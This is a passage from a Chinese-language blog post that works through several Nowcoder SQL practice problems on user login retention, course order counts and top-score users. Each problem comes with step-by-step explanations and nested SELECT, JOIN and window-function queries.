alt=""></p><p>不慌，那就在上面这基础上改一下，毕竟天下没有白写的bug</p><p>这里是因为用WHERE IN过滤了才会导致有些日期没有了，所以要保证都有思路上还是直接FROM 原表并且不做任何过滤。这种没有的情况，与其最近的则是NULL。那么，为了填补日期，我们考虑用表连接来完成（将没有的日期先补成NULL），这种显然可以通过<code>LEFT JOIN</code>或<code>RIGHT JOIN</code>完成。这里将原表写在左边，所以使用<code>LEFT JOIN</code>（LEFT JOIN ：以左表为基准，右表没有的行数返回NULL）</p><p>为了SQL语句简介，先将上面的错误查询当作表a，并将a表中的COUNT(<em>)给个别名，这里写出`COUNT(</em>) AS num`</p><blockquote><p>– 表连接（填补缺少的日期）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> login.date,a.num <span class="hljs-keyword">FROM</span> login<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> a <span class="hljs-keyword">ON</span> login.date = a.date<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span></code></pre></div></blockquote><p>这种情况下，a.num会是NULL值，因而需要将NULL替换成0，使用<code>IFNULL(a.num,0)</code>即可完成，并将a表写入，最后SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> login.date,<span class="hljs-keyword">IFNULL</span>(a.num,<span class="hljs-number">0</span>) <span class="hljs-keyword">FROM</span> login<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> (    <span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">date</span>,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> login    <span class="hljs-keyword">WHERE</span> (user_id,<span class="hljs-built_in">date</span>) <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>) <span class="hljs-keyword">FROM</span> login    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id    )    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span>    <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span>) a <span class="hljs-keyword">ON</span> login.date = a.date<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span></code></pre></div><h4 id="SQL70-牛客每个人最近的登录日期-五-（困难）"><a href="#SQL70-牛客每个人最近的登录日期-五-（困难）" class="headerlink" title="SQL70 牛客每个人最近的登录日期(五)（困难）"></a><a href="https://www.nowcoder.com/practice/ea0c56cd700344b590182aad03cc61b8?tpId=82&amp;tags=&amp;title=&amp;difficulty=0&amp;judgeStatus=0&amp;rp=1" target="_blank" rel="noopener"><strong>SQL70</strong> <strong>牛客每个人最近的登录日期(五)</strong></a>（困难）</h4><blockquote><p>描述</p><p>牛客每天有很多人登录，请你统计一下牛客每个日期新用户的次日留存率。<br>有一个登录(login)记录表，简况如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20200820/557336_1597903752757_A02F3DF1419BC2D3D4EE9B2B4557053B" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示user_id为2的用户在2020-10-12使用了客户端id为1的设备登录了牛客网，因为是第1次登录，所以是新用户<br>。。。<br>第4行表示user_id为2的用户在2020-10-13使用了客户端id为2的设备登录了牛客网，因为是第2次登录，所以是老用户<br>。。<br>最后1行表示user_id为4的用户在2020-10-15使用了客户端id为1的设备登录了牛客网，因为是第2次登录，所以是老用户</p><p>请你写出一个sql语句查询每个日期新用户的次日留存率，结果保留小数点后面3位数(3位之后的四舍五入)，并且查询结果按照日期升序排序，上面的例子查询结果如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20200820/557336_1597903761838_F734DB69B9941F0DF86776922B0CF347" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>查询结果表明:<br>2020-10-12登录了3个(user_id为2，3，1)新用户，2020-10-13，只有2个(id为2,1)登录，故2020-10-12新用户次日留存率为2/3=0.667;<br>2020-10-13没有新用户登录，输出0.000;<br>2020-10-14登录了1个(user_id为4)新用户，2020-10-15，user_id为4的用户登录，故2020-10-14新用户次日留存率为1/1=1.000;</p><p>2020-10-15没有新用户登录，输出0.000;</p><p>(注意:sqlite里查找某一天的后一天的用法是:date(yyyy-mm-dd, ‘+1 day’)，sqlite里1/2得到的不是0.5，得到的是0，只有1*1.0/2才会得到0.5)</p></blockquote><p>如果前面日期的题都掌握了，其实这道题很容易。老套路，SQL语句从里到外看，无限套娃。</p><ol><li><p>首先是计算每天的次日用户数</p><blockquote><p>– 子查询（次日留存用户数）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">DATE</span>(<span class="hljs-built_in">date</span><span class="hljs-number">-1</span>) <span class="hljs-keyword">AS</span> <span class="hljs-built_in">date</span>,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> login<span class="hljs-keyword">WHERE</span> (user_id,<span class="hljs-built_in">date</span>) <span class="hljs-keyword">IN</span> (    <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-built_in">DATE</span>(<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>)+<span class="hljs-number">1</span>) <span class="hljs-keyword">FROM</span> login    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id)<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span></code></pre></div></blockquote><p>这里<code>MIN(date)+1</code>来作为留存筛选条件，然后在SELECT处将日期减回去</p></li><li><p>每天的注册用户数</p><blockquote><p>– 子查询（注册用户数）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> a.date,(b.num/a.num) <span class="hljs-keyword">AS</span> p <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">date</span>,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> (        <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-built_in">DATE</span>(<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>)) <span class="hljs-keyword">AS</span> <span class="hljs-built_in">date</span> <span class="hljs-keyword">FROM</span> login            <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id    ) eee    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span></code></pre></div></blockquote></li><li><p>将子查询（次日留存用户数）与子查询（注册用户数）连接相处，得到结果</p><blockquote><p>– 子查询（ 得到每天的留存率）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> a.date,(b.num/a.num) <span class="hljs-keyword">AS</span> p <span class="hljs-keyword">FROM</span> (     <span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">date</span>,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> (         <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-built_in">DATE</span>(<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>)) <span class="hljs-keyword">AS</span> <span class="hljs-built_in">date</span> <span class="hljs-keyword">FROM</span> login             <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id     ) eee     <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span> ) a <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> (     <span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">DATE</span>(<span class="hljs-built_in">date</span><span class="hljs-number">-1</span>) <span class="hljs-keyword">AS</span> <span class="hljs-built_in">date</span>,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> login     <span class="hljs-keyword">WHERE</span> (user_id,<span class="hljs-built_in">date</span>) <span class="hljs-keyword">IN</span> (         <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-built_in">DATE</span>(<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>)+<span class="hljs-number">1</span>) <span class="hljs-keyword">FROM</span> login         <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id     )     <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span>     <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span> ) b <span class="hljs-keyword">ON</span> a.date = b.date <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> a.date <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> a.date</code></pre></div></blockquote><p>到这一步已经得到结果了，但是仍然出现了<strong>SQL69</strong> <strong>牛客每个人最近的登录日期(四)</strong>里最开始的那种情况：留存率为0的日期没有显示出来。</p></li><li><p>再套娃</p><p>再以原表作为基表，LEFT JOIN 操作一次</p></li></ol><p>最终SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> login.date,<span class="hljs-keyword">ROUND</span>(<span class="hljs-keyword">IFNULL</span>(c.p,<span class="hljs-number">0</span>),<span class="hljs-number">3</span>) <span class="hljs-keyword">AS</span> p <span class="hljs-keyword">FROM</span> login<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> (    <span class="hljs-keyword">SELECT</span> a.date,(b.num/a.num) <span class="hljs-keyword">AS</span> p <span class="hljs-keyword">FROM</span> (        <span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">date</span>,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> (            <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-built_in">DATE</span>(<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>)) <span class="hljs-keyword">AS</span> <span class="hljs-built_in">date</span> <span class="hljs-keyword">FROM</span> login                <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id        ) eee        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span>    ) a    <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> (        <span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">DATE</span>(<span class="hljs-built_in">date</span><span class="hljs-number">-1</span>) <span class="hljs-keyword">AS</span> <span class="hljs-built_in">date</span>,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">FROM</span> login        <span class="hljs-keyword">WHERE</span> (user_id,<span class="hljs-built_in">date</span>) <span class="hljs-keyword">IN</span> (            <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-built_in">DATE</span>(<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>)+<span class="hljs-number">1</span>) <span class="hljs-keyword">FROM</span> login            <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id        )        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span>        <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span>    ) b    <span class="hljs-keyword">ON</span> a.date = b.date    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> a.date    <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> a.date) c<span class="hljs-keyword">ON</span> login.date = c.date</code></pre></div><h4 id="SQL80-牛客的课程订单分析-四-（较难）"><a href="#SQL80-牛客的课程订单分析-四-（较难）" class="headerlink" title="SQL80 牛客的课程订单分析(四)（较难）"></a><a href="https://www.nowcoder.com/practice/c93d2079282f4943a3771ca6fd081c23?tpId=82&amp;tags=&amp;title=&amp;difficulty=0&amp;judgeStatus=0&amp;rp=1" target="_blank" rel="noopener"><strong>SQL80</strong> <strong>牛客的课程订单分析(四)</strong></a>（较难）</h4><blockquote><p>描述</p><p>有很多同学在牛客购买课程来学习，购买会产生订单存到数据库里。</p><p>有一个订单信息表(order_info)，简况如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210226/310548_1614310851199/05757BC2D70D6C85A451733582C84202" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示user_id为557336的用户在2025-10-10的时候使用了client_id为1的客户端下了C++课程的订单，但是状态为没有购买成功。</p><p>第2行表示user_id为230173543的用户在2025-10-12的时候使用了client_id为2的客户端下了Python课程的订单，状态为购买成功。</p><p>。。。</p><p>最后1行表示user_id为557336的用户在2025-10-25的时候使用了client_id为1的客户端下了Python课程的订单，状态为购买成功。</p><p>请你写出一个sql语句查询在2025-10-15以后，如果有一个用户下单2个以及2个以上状态为购买成功的C++课程或Java课程或Python课程，那么输出这个用户的user_id，以及满足前面条件的第一次购买成功的C++课程或Java课程或Python课程的日期first_buy_date，以及购买成功的C++课程或Java课程或Python课程的次数cnt，并且输出结果按照user_id升序排序，以上例子查询结果如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210226/310548_1614310860082/0CDA2587932AE43AF2BB6299FA683419" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>解析:</p><p>id为4，6的订单满足以上条件，输出57，id为4的订单为第一次购买成功，输出first_buy_date为2025-10-23，总共成功购买了2次;</p><p>id为5，7，8的订单满足以上条件，输出557336，id为5的订单为第一次购买成功，输出first_buy_date为2025-10-23，总共成功购买了3次;</p></blockquote><p>因为是分用户，所以还是需要<code>GROUP BY</code>操作，SELECE后面的字段可以有MIN(date),COUNT(*) ，这样SELECT之后的字段就没有出现（group by指定列，聚合函数，常熟）以外的字段了</p><blockquote><p>– 逻辑框架</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>),<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> cnt <span class="hljs-keyword">FROM</span> order_info<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id</code></pre></div></blockquote><p>之后补充题目要求条件，完整SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">MIN</span>(<span class="hljs-built_in">date</span>),<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">AS</span> cnt <span class="hljs-keyword">FROM</span> order_info<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">status</span> =<span class="hljs-string">'completed'</span><span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)<span class="hljs-keyword">AND</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id<span class="hljs-keyword">HAVING</span> <span class="hljs-keyword">COUNT</span>(*)&gt;=<span class="hljs-number">2</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> user_id</code></pre></div><h4 id="SQL81-牛客的课程订单分析-五-（困难）"><a href="#SQL81-牛客的课程订单分析-五-（困难）" class="headerlink" title="SQL81 牛客的课程订单分析(五)（困难）"></a><a href="https://www.nowcoder.com/practice/348afda488554ceb922efd2f3effc427?tpId=82&amp;tags=&amp;title=&amp;difficulty=0&amp;judgeStatus=0&amp;rp=1" target="_blank" rel="noopener"><strong>SQL81</strong> <strong>牛客的课程订单分析(五)</strong></a>（困难）</h4><blockquote><p>描述</p><p>有很多同学在牛客购买课程来学习，购买会产生订单存到数据库里。</p><p>有一个订单信息表(order_info)，简况如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210226/310548_1614320881447/390E1A747B9D2D6DF976278C6AE5D0DB" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示user_id为557336的用户在2025-10-10的时候使用了client_id为1的客户端下了C++课程的订单，但是状态为没有购买成功。</p><p>第2行表示user_id为230173543的用户在2025-10-12的时候使用了client_id为2的客户端下了Python课程的订单，状态为购买成功。</p><p>。。。</p><p>最后1行表示user_id为557336的用户在2025-10-26的时候使用了client_id为1的客户端下了Python课程的订单，状态为购买成功。</p><p>请你写出一个sql语句查询在2025-10-15以后，如果有一个用户下单2个以及2个以上状态为购买成功的C++课程或Java课程或Python课程，那么输出这个用户的user_id，以及满足前面条件的第一次购买成功的C++课程或Java课程或Python课程的日期first_buy_date，以及满足前面条件的第二次购买成功的C++课程或Java课程或Python课程的日期second_buy_date，以及购买成功的C++课程或Java课程或Python课程的次数cnt，并且输出结果按照user_id升序排序，以上例子查询结果如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210226/310548_1614320891682/E781EA8A3E13F91AD1409831A1854DE3" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>解析:</p><p>id为4，6的订单满足以上条件，输出57，id为4的订单为第一次购买成功，输出first_buy_date为2025-10-23，id为6的订单为第二次购买，输出second_buy_date为2025-10-24，总共成功购买了2次;</p><p>id为5，7，8的订单满足以上条件，输出557336，id为5的订单为第一次购买成功，输出first_buy_date为2025-10-23，id为7的订单为第二次购买，输出second_buy_date为2025-10-25，总共成功购买了3次;</p></blockquote><ol><li><p>先取出(user_id,second_buy_date)作为一个子表</p><blockquote><p>– 子查询（第二次下单时间）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-built_in">date</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,user_id,<span class="hljs-built_in">date</span>,ROW_NUMBER() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> user_id <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span>) <span class="hljs-keyword">AS</span> rs <span class="hljs-keyword">FROM</span> order_info<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span><span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)<span class="hljs-keyword">AND</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span>) a<span class="hljs-keyword">WHERE</span> rs = <span class="hljs-number">2</span>  <span class="hljs-comment">--第二次下单</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> user_id</code></pre></div></blockquote></li><li><p>表连接</p><p>将上面的子查询得到的结果给个表别名b，为了简单描述下面我用b来代替上面的子查询</p><p>因为用户id是唯一且共同的，因而可以作为连接键将两个表（子表b与原表）连接</p><blockquote><p>– 表连接</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span>  order_info.user_id,<span class="hljs-built_in">DATE</span>(<span class="hljs-keyword">MIN</span>(order_info.date)),<span class="hljs-comment">--第一次下单</span>b.date,<span class="hljs-comment">--第二次下单</span><span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">FROM</span> order_info<span class="hljs-keyword">JOIN</span> b <span class="hljs-keyword">ON</span> order_info.user_id = b.user_id</code></pre></div></blockquote></li></ol><p>完整SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> order_info.user_id,<span class="hljs-built_in">DATE</span>(<span class="hljs-keyword">MIN</span>(order_info.date)),b.date,<span class="hljs-keyword">COUNT</span>(*) <span class="hljs-keyword">FROM</span> order_info<span class="hljs-keyword">JOIN</span> (    <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-built_in">date</span> <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,user_id,<span class="hljs-built_in">date</span>,ROW_NUMBER() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> user_id <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span>) <span class="hljs-keyword">AS</span> rs <span class="hljs-keyword">FROM</span> order_info    <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span>    <span class="hljs-keyword">AND</span> product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)    <span class="hljs-keyword">AND</span> <span class="hljs-built_in">date</span> &gt; <span class="hljs-string">'2025-10-15'</span>    ) a    <span class="hljs-keyword">WHERE</span> rs = <span class="hljs-number">2</span>    <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> user_id) b <span class="hljs-keyword">ON</span> order_info.user_id = b.user_id<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">status</span> = <span class="hljs-string">'completed'</span><span class="hljs-keyword">AND</span> order_info.product_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'C++'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-string">'Python'</span>)<span class="hljs-keyword">AND</span> order_info.date &gt; <span class="hljs-string">'2025-10-15'</span><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> order_info.user_id<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> order_info.user_id</code></pre></div><h4 id="SQL90-获得积分最多的人-二-（较难）"><a href="#SQL90-获得积分最多的人-二-（较难）" class="headerlink" title="SQL90 获得积分最多的人(二)（较难）"></a><a href="https://www.nowcoder.com/practice/b6248d075d2d4213948b2e768080dc92?tpId=82&amp;tags=&amp;title=&amp;difficulty=0&amp;judgeStatus=0&amp;rp=1" target="_blank" rel="noopener"><strong>SQL90</strong> <strong>获得积分最多的人(二)</strong></a>（较难）</h4><blockquote><p>描述</p><p>牛客每天有很多用户刷题，发帖，点赞，点踩等等，这些都会记录相应的积分。</p><p>有一个用户表(user)，简况如下：</p><p><img src="https://uploadfiles.nowcoder.com/images/20210328/301499_1616896023720/B9EE61A3CF7F34EF411FE1A9C6B86FBC" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>还有一个积分表(grade_info)，简况如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210328/301499_1616900022314/5A84E57F33739CFEC87F578CD60DB6A3" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示，user_id为1的用户积分增加了3分。</p><p>第2行表示，user_id为2的用户积分增加了3分。</p><p>第3行表示，user_id为1的用户积分又增加了1分。</p><p>…….</p><p>最后1行表示，user_id为3的用户积分增加了1分。</p><p>请你写一个SQL查找积分增加最高的用户的id(可能有多个)，名字，以及他的总积分是多少，查询结果按照id升序排序，以上例子查询结果如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210328/301499_1616900118014/B64703D5542E7DE36EC9394C05E69FBF" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>解释:</p><p>user_id为1和3的2个人，积分都为4，都要输出</p></blockquote><ol><li><p>因为是分组求和，所以还是先<code>GROUP BY</code>+<code>SUM()</code>一顿操作。</p><p>此外，为了筛选出grade之和最多的，这里通过排序来实现，所以在上述分组求和的基础上再嵌套一层SELECT语句</p><blockquote><p>– 子查询（子表b）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> *,<span class="hljs-keyword">DENSE_RANK</span>() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade_sum <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">AS</span> rs <span class="hljs-keyword">FROM</span> ( <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">SUM</span>(grade_num) <span class="hljs-keyword">AS</span> grade_sum <span class="hljs-keyword">FROM</span> grade_info <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id) a</code></pre></div></blockquote></li><li><p>上述查询结果中已经有了需要的直接或间接数据，所以只需要再做表连接和WHERE过滤操作即可。</p><p>取排序最高的，即rs=1，SQL逻辑如下：</p><blockquote><p>– 查询逻辑</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user.id,user.name,grade_sum<span class="hljs-keyword">FROM</span> b<span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">user</span><span class="hljs-keyword">ON</span> user.id = b.user_id<span class="hljs-keyword">WHERE</span> rs = <span class="hljs-number">1</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> user.id</code></pre></div></blockquote></li></ol><p>完整SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user.id,user.name,grade_sum<span class="hljs-keyword">FROM</span> (        <span class="hljs-keyword">SELECT</span> *,<span class="hljs-keyword">DENSE_RANK</span>() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade_sum <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">AS</span> rs     <span class="hljs-keyword">FROM</span> (        <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">SUM</span>(grade_num) <span class="hljs-keyword">AS</span> grade_sum <span class="hljs-keyword">FROM</span> grade_info        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id    ) a    ) b<span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">user</span><span class="hljs-keyword">ON</span> user.id = b.user_id<span class="hljs-keyword">WHERE</span> rs = <span class="hljs-number">1</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> user.id</code></pre></div><h4 id="SQL91-获得积分最多的人-三-（困难）"><a href="#SQL91-获得积分最多的人-三-（困难）" class="headerlink" title="SQL91 获得积分最多的人(三)（困难）"></a><a href="https://www.nowcoder.com/practice/d2b7e2a305a7499fb310dc82a43820e8?tpId=82&amp;tags=&amp;title=&amp;difficulty=0&amp;judgeStatus=0&amp;rp=1" target="_blank" rel="noopener"><strong>SQL91</strong> <strong>获得积分最多的人(三)</strong></a>（困难）</h4><blockquote><p>描述</p><p>牛客每天有很多用户刷题，发帖，点赞，点踩等等，这些都会记录相应的积分。</p><p>有一个用户表(user)，简况如下：</p><p><img src="https://uploadfiles.nowcoder.com/images/20210328/301499_1616896023720/B9EE61A3CF7F34EF411FE1A9C6B86FBC" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>还有一个积分表(grade_info)，简况如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210328/301499_1616905385537/13C8EB67E494299F9396F462A8D0728D" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示，user_id为1的用户积分增加了3分。</p><p>第2行表示，user_id为2的用户积分增加了3分。</p><p>第3行表示，user_id为1的用户积分减少了1分。</p><p>…….</p><p>最后1行表示，user_id为3的用户积分减少了1分。</p><p>请你写一个SQL查找积分最高的用户的id，名字，以及他的总积分是多少(可能有多个)，查询结果按照id升序排序，以上例子查询结果如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210328/301499_1616905506009/26B900CFF8FB6BE2B2077D494CA1F237" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>解释:</p><p>user_id为1和3的先加了3分，但是后面又减了1分，他们2个是2分，</p><p>其他3个都是3分，所以输出其他三个的数据</p></blockquote><p>这道题是牛客最后一道题，但是挺简单的。</p><p>先来看这道题与众不同的是，有加（add）和减（reduce）两种操作，但是记录的数值都是正数，所以显然不能直接用<code>SUM()</code>，所以在用SUM之前我们先将其转换一下：</p><ol><li><p>把type = ‘reduce’的grade_num变成负数</p><blockquote><p>– grade_num数值的转换（子表a）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user_id,grade_num <span class="hljs-keyword">AS</span> g <span class="hljs-keyword">FROM</span> grade_info<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">type</span> = <span class="hljs-string">'add'</span><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span><span class="hljs-keyword">SELECT</span> user_id,(-grade_num) <span class="hljs-keyword">AS</span> g <span class="hljs-keyword">FROM</span> grade_info<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">type</span> = <span class="hljs-string">'reduce'</span></code></pre></div></blockquote><p>将type字段是’add’的数据正常取出，将type字段是’reduce’给其grade_num加个负号</p><p>注意：这里一定要用<code>UNION ALL</code>而不能用UNION（UNION会去重，而UNION ALL不去重）</p><p>这样两个查询结果就上下拼接起来了（上面部分是grade_num为正数的行，下面部分是grade_num为负数的行，而它们都有相同的字段名）</p></li><li><p>求和排序</p><p>因为还是要求和并且取最高的，所以按老套路求和之后再套上一层SELECT</p><blockquote><p>– 求和排序（子表c）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> 